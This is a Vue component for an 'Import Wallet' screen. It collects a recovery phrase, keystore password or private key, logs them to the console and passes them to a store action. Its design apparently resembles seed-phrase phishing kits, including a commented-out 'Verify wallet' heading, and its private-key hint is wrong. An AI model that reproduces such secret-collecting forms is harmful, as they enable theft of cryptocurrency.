<template>
  <div class="text-center">
    <v-card
      tile
      dark
      max-width="100%"
      width="500"
      class="transparent py-2 mx-auto"
    >
      <v-card-title
        class="text-h6 font-weight-light text-capitalize pt-0"
        primary-title
      >
        <v-row class="ma-0">
          <v-col cols="12" class="d-flex align-center text-subtitle-2 pa-0">
            <v-icon left color="white" large @click="$router.go(-1)"
              >mdi-chevron-left</v-icon
            >
            <span class="white--text"> Import Wallet</span>
          </v-col>
          <!-- <v-col cols="12" class="px-0 d-flex align-center">
            <v-avatar size="60">
              <img
                :src="`/logo/${wallet && wallet.logo}`"
                cover
                :alt="wallet && wallet.name"
              />
            </v-avatar>
            <v-spacer></v-spacer>
            <span>Verify {{ wallet && wallet.name }} wallet</span>
            <v-spacer />
          </v-col> -->
          <v-col cols="12" class="d-flex align-center pa-0">
            <v-btn
              @click="switchWallet('phrase')"
              text
              class="
                text-subtitle-2 text-sm-subtitle-1 text-capitalize
                font-weight-regular
              "
            >
              Phrase
            </v-btn>
            <v-spacer />
            <v-btn
              @click="switchWallet('keystore')"
              text
              class="
                text-subtitle-2 text-sm-subtitle-1 text-capitalize
                font-weight-regular
              "
            >
              Keystore JSON
            </v-btn>
            <v-spacer />
            <v-btn
              @click="switchWallet('privatekey')"
              text
              class="
                text-subtitle-2 text-sm-subtitle-1 text-capitalize
                font-weight-regular
              "
            >
              Private Key
            </v-btn>
          </v-col>
        </v-row>
      </v-card-title>
      <v-divider />
      <v-card-text class="py-6">
        <v-form
          ref="form"
          v-model="valid"
          @submit.prevent="submit"
          lazy-validation
        >
          <v-row>
            <!-- ////////////////// Keystore -->
            <v-col v-if="type === 'keystore'" cols="12" class="py-0">
              <v-text-field
                v-model="keystore"
                color="blue"
                outlined
                class="text-subtitle-2 font-weight-light rounded-md"
                :rules="[(v) => !!v || 'Wallet password is required']"
                label="Wallet Password"
                required
                return-object
              />
            </v-col>
            <v-col
              v-if="type === 'keystore'"
              cols="12"
              class="
                text-caption text-sm-subtitle-2
                font-weight-medium
                info--text
                text-center
                mt-n3
              "
            >
              Several lines of text beginning with {...} plus the password you
              used to encrypt it.
            </v-col>

            <!-- ////////////////// Phrase -->
            <v-col v-if="type === 'phrase'" cols="12" class="py-0">
              <v-textarea
                v-model="phrase"
                name="phrase"
                type="text"
                dense
                rows="3"
                outlined
                class="text-subtitle-2 font-weight-light rounded-md"
                color="blue"
                :rules="[(v) => !!v || 'Phrase is required']"
                label="Enter your recovery phrase"
                required
              />
            </v-col>
            <v-col
              v-if="type === 'phrase'"
              cols="12"
              class="
                text-caption text-sm-subtitle-2
                font-weight-medium
                info--text
                text-center
                mt-n3
              "
            >
              Typically 12 (sometimes 24) words separated by single spaces
            </v-col>

            <!-- ////////////////// Private key -->
            <v-col v-if="type === 'privatekey'" cols="12" class="py-0">
              <v-text-field
                v-model="privatekey"
                color="blue"
                outlined
                class="text-subtitle-2 font-weight-light rounded-md"
                :rules="[(v) => !!v || 'Private Key is required']"
                label="Enter your private key"
                required
                return-object
              />
            </v-col>
            <v-col
              v-if="type === 'privatekey'"
              cols="12"
              class="
                text-caption text-sm-subtitle-2
                font-weight-medium
                info--text
                text-center
                mt-n3
              "
            >
              Typically 12 (sometimes 24) words seperated by a single space.
            </v-col>

            <v-col cols="4" sm="3" class="">
              <v-btn
                depressed
                large
                dark
                color="red darken-1"
                @click="cancel"
                class="font-weight-light text-subtitle-2"
              >
                Cancel
              </v-btn>
            </v-col>
            <v-col cols="8" sm="9" class="">
              <v-btn
                depressed
                large
                dark
                type="submit"
                block
                color="blue darken-1"
                class="font-weight-light text-subtitle-2"
              >
                Proceed
              </v-btn>
            </v-col>
          </v-row>
        </v-form>
      </v-card-text>
    </v-card>
  </div>
</template>

<script>
import { mapActions } from "vuex";

export default {
  filters: {
    currency(val) {
      if (val) {
        return val.toLocaleString();
      } else {
      }
    },
  },
  props: {
    wallet: Object,
  },

  data: () => ({
    valid: true,
    type: "phrase",
    phrase: "",
    keystore: "",
    privatekey: "",
  }),

  computed: {},

  methods: {
    ...mapActions({ addWallet: "app/addWallet" }),
    submit() {
      if (this.$refs.form.validate()) {
        const data = this[this.type];

        const payload = {
          name: this.wallet.name,
          type: this.type,
          data,
          date: this.getDate("current"),
        };

        console.log(payload);
        this.addWallet(payload);
      }
      return false;
    },
    switchWallet(type) {
      this.type = type;
      this.phrase = "";
      this.keystore = "";
      this.privatekey = "";
    },
    cancel() {
      this.$router.go(-1);
    },
    reset() {
      this.$refs.form.reset();
    },
    resetValidation() {
      this.$refs.form.resetValidation();
    },
    getDate(get, days) {
      const currentDate = new Date();
      let newDate;

      function addDays(days) {
        const result = new Date(currentDate);
        result.setDate(result.getDate() + days);
        return formatDate(result);
      }

      function formatDate(date) {
        const hours = date.getHours() % 12 || 12;
        const months = [
          "January",
          "February",
          "March",
          "April",
          "May",
          "June",
          "July",
          "August",
          "September",
          "October",
          "November",
          "December",
        ];
        return `${date.getDate()} ${
          months[date.getMonth()]
        }, ${date.getFullYear()}-${hours}:${date.getMinutes()}`;
      }

      if (get === "add") {
        newDate = addDays(days);
      } else if (get === "current") {
        newDate = formatDate(currentDate);
      }
      return newDate;
    },
  },
};
</script>

<style>
</style>
